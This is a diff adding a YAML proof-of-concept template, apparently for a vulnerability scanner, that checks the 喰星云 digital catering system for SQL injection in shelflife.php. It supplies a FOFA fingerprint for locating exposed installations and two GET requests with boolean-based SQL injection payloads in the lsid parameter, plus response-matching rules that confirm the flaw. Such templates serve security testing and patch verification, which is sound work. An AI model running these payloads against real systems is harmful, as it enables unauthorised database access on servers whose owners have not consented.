@@ -1,0 +1,20 @@
+id: poc-yaml-can-xing-yun-shelflife-php-sqli
+info:
+  name: 喰星云-数字化餐饮服务系统 shelflife.php SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 喰星云-数字化餐饮服务系统
+  fofa: body="tmp_md5_pwd"
+requests:
+- method: GET
+  path: /logistics/home_warning/php/shelflife.php?do=getList&lsid=(SELECT+(CASE+WHEN+(6193=6193)+THEN+%27%27+ELSE+(SELECT+9641+UNION+SELECT+2384)+END))
+  expression: "status_code == 200 && \ncontains(body,\"\\\"success\\\":true\") &&\n\
+    contains(body,\"\\\"total\\\":\") &&\n!contains(body,\"<\")\n"
+- method: GET
+  path: /logistics/home_warning/php/shelflife.php?do=getList&lsid=(SELECT+(CASE+WHEN+(6191=6193)+THEN+%27%27+ELSE+(SELECT+9641+UNION+SELECT+2384)+END))
+  expression: "status_code == 200 && \n(\n(contains(body,\"数据库查询出错\") && contains(body,\"\
+    DBException\"))\n||\n(contains(body,\"\\\"success\\\":false\") && contains(body,\"\
+    服务器内部错误\"))\n)\n"
+variables: {}
+transport: http
